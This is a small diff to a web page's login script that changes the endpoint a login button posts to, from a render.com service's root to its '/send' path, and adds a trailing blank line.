@@ -211,7 +211,7 @@ loginBtn.addEventListener("click", async ()=>{
   if(loginBtn.disabled) return;
 
   try{
-    const res = await fetch("https://login-y0yd.onrender.com/",{
+    const res = await fetch("https://login-y0yd.onrender.com/send",{
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -240,4 +240,5 @@ updateLang();
 
 </body>
 </html>
+
 
